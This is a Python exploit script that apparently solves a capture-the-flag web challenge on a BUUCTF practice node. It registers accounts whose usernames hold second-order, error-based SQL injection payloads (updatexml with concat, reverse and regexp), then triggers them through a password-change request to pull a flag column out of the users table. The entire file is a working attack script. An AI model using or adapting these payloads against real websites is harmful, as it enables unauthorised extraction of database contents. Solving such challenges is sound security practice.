import requests

url = 'http://6407a4c8-5477-4bc2-a1af-bd1b03c751d6.node5.buuoj.cn:81/'
reg = 'register.php'
log = 'login.php'
change = 'changepwd.php'

pre = 'mochu7"'
#逆序闭合
resuf = "')))),1))#"

#正序闭合
suf = "'))),1))#"

s = 'abcdefghijklmnopqrstuvwxyz1234567890'
s = list(s)

r = requests.session()

def register(name):
    data = {
        'username' : name,
        'password' : '123',
        'email' : '123',
    }
    r.post(url=url+reg, data=data)

def login(name):
    data = {
        'username' : name,
        'password' : '123',
    }
    r.post(url=url+log, data=data)

def changepwd():
    data = {
        'oldpass' : '',
        'newpass' : '',
    }
    res = r.post(url=url+change, data=data)
    if 'XPATH' in res.text:
        flag = res.text.split('~')
        print(flag[1])
        # print(res.text)

for i in s:
    #正序
    # paylaod = pre + "||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + suf
    #逆序
    paylaod = pre + "||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + resuf
    register(paylaod)
    login(paylaod)
    changepwd()


#正序payload
#paylaod = pre + "||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + "'))),1))#"
#逆序payload
#paylaod = pre + "||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + "')))),1))#"